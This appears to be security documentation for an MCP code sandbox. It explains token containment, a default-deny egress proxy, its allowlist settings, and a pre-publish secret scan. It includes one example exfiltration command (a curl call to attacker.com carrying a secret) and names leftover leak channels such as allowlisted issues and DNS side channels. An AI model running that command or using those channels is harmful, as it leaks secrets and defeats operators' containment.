# Security Model & Network Containment

The sandbox offers two **independent** guarantees. They are easy to conflate, so keep them distinct: one is always on and does not involve the egress proxy at all; the other is what the (opt-in) egress proxy adds.

---

## 1. Token Containment (Always On)

The sandbox container **never receives a VCS token.** There is no opt-in flag: credentials stay host-side. This is enforced by *how the write tools work*, not by the network layer — so it holds whether or not the egress proxy is enabled.

*   **Reads** (`sandbox_initialize(clone_repo=...)`, `pr=N`): A public clone needs no credentials; a private one has a host-resolved token handed to the proxy for a short read-authorization grant (this path does require the proxy). Either way, no token enters the container.
*   **Pushes / PRs** go through `publish`: It resolves a token host-side and hands it to the proxy for a short authorized push grant (push), or calls the GitHub API directly from the host (PR creation).
*   **Issue / comment writes** go through `sandbox_issue_write`, which calls the GitHub REST API host-side.
*   All output is automatically sanitized: Any token value is masked as `KEY=***` in stdout/stderr.

This follows the principle of least privilege — the container's own `git`/`gh` stay unauthenticated, so a stray in-container `git push` has no credential to leak.

---

## 2. Egress Containment (Egress Proxy)

The egress proxy is **enabled by default**. Set `SUNABA_ENABLE_EGRESS_PROXY=false` to opt out. 

When enabled, the container's only route to the outside is the HTTP(S) proxy on an internal Docker network — SSH, arbitrary TCP, and direct-to-IP egress are cut off by that topology alone. 

On top of that, the proxy is a **default-deny egress gate**: a request to a host outside the allowlist is refused with a `403`, so arbitrary exfil (e.g. `curl https://attacker.com/?d=secret`) is blocked, not just git pushes. Two allowlists, deliberately separate, govern the two different questions:

*   **Where the sandbox may connect** — `SUNABA_ALLOWED_EGRESS_HOSTS` (destination hosts). Defaults to GitHub and the package registries; everything else is denied.
*   **Where the sandbox may write** — `SUNABA_ALLOWED_REPOS` (push / GitHub-API-write targets). Reachability says nothing about write authorization; a repo can be cloneable but not pushable.

Use `allow_network=True` only when containers actually need network access. For the read/push grants to authenticate, the proxy must be configured with a host-resolvable token (broker / `GITHUB_TOKEN`).

### What each configuration guarantees

| Guarantee | Proxy **OFF** | Proxy **ON** (Default) |
|---|---|---|
| No token ever enters the container | ✅ (proxy-independent) | ✅ |
| Push restricted to an allowlist (network layer) | ❌ | ✅ (`SUNABA_ALLOWED_REPOS`) |
| Non-HTTP egress cut off (SSH / raw TCP / direct IP) | ❌ (`allow_network=True` is unrestricted) | ✅ (internal network, proxy is the only exit) |
| Arbitrary-host egress denied (exfil containment) | ❌ | ✅ (`SUNABA_ALLOWED_EGRESS_HOSTS`, default-deny) |
| Private-repo read (`clone` / `pr=N`) | ❌ (anonymous clone only) | ✅ (read grant) |
| Fail-closed (network start refused if the proxy fails to start) | — | ✅ |

> [!IMPORTANT]
> **Who should turn the proxy off?** Almost nobody — which is why it is on by default. The case for the proxy is strongest exactly where this MCP is meant to be used: the sandbox runs code you do not fully trust (AI-generated, third-party dependencies, anything that could be prompt-injected) and you would rather it could not phone home. Turning it off (`SUNABA_ENABLE_EGRESS_PROXY=false`) is for the narrower cases where the containment is not worth its cost: a trusted CI runner, or a session that must reach a destination you cannot enumerate in advance. Token containment holds either way, so opting out costs you the *egress* boundary, not the credential boundary.

> [!WARNING]
> **What it does *not* guarantee.** Egress containment stops connections to *off-allowlist hosts*; it does not stop a determined exfil over an *allowlisted* channel (e.g. writing secrets into an issue on an allowed repo, or DNS/SNI side channels). It is a structural barrier against casual/arbitrary egress, not a complete information-flow boundary.

## 3. Configuring the Egress Proxy

### Push targets (`SUNABA_ALLOWED_REPOS`)
`SUNABA_ALLOWED_REPOS` is the allowlist of repositories the sandbox may push to:

```bash
# Allow pushes to specific repositories
SUNABA_ALLOWED_REPOS="owner/repo-a,owner/repo-b"
```

If `SUNABA_ALLOWED_REPOS` is unset or does not include the target repository, `publish` will fail with a clear error message. The push is **not** silently redirected through the Objects API fallback — this is intentional: bypassing the proxy would hide a configuration error and let administration proceed with a misconfigured setup.

### Destination hosts (`SUNABA_ALLOWED_EGRESS_HOSTS`)
`SUNABA_ALLOWED_EGRESS_HOSTS` extends the built-in set of hosts the sandbox may reach at all:

```bash
# Allow the sandbox to also reach an internal mirror and any *.example.com host
SUNABA_ALLOWED_EGRESS_HOSTS="mirror.internal, .example.com"
```

*   The built-in defaults — `github.com`, `api.github.com`, `codeload.github.com`, `*.githubusercontent.com`, `pypi.org`, `files.pythonhosted.org`, `registry.npmjs.org`, `proxy.golang.org`, `sum.golang.org` — are **always** allowed so `git`, `pip`, `go`, and `npm` work out of the box; operator entries only *add* to them.
*   An entry beginning with `.` matches that domain and its subdomains (`.example.com` → both `example.com` and `a.example.com`).
*   The single value `*` disables destination-host containment entirely (any host passes), restoring the pre-containment passthrough behaviour for operators who need it.

### Applying changes
The proxy runs as a long-lived sidecar container (`sunaba-egress-proxy`) that reads these variables once, at its own startup. You do not need to restart or remove it by hand: the next `sandbox_initialize` or `publish` compares the sidecar's baked-in configuration against the current environment and recreates it when they differ. Recreation does not disturb running sandboxes — the proxy CA is persisted in a named volume and stays the same.

## 4. Secret Scan (Issue #676)

`publish` automatically scans manifest-declared files for potential secrets using Yelp's `detect-secrets` before pushing. The scanner is baked into the base Docker image and runs inside the container.

**Configuration:**

*   `SUNABA_SECRETS_BASELINE` (default: `true`) — When enabled, a repo-local `.secrets.baseline` file suppresses known/approved findings across publishes.
*   **Override tool**: `secret_scan_override` is a separate MCP tool (not a `publish` argument). Call it when a publish is blocked by a false-positive finding. With baseline enabled, it appends the finding to `.secrets.baseline` so it is not re-flagged; with baseline disabled, the override is one-time and in-memory.
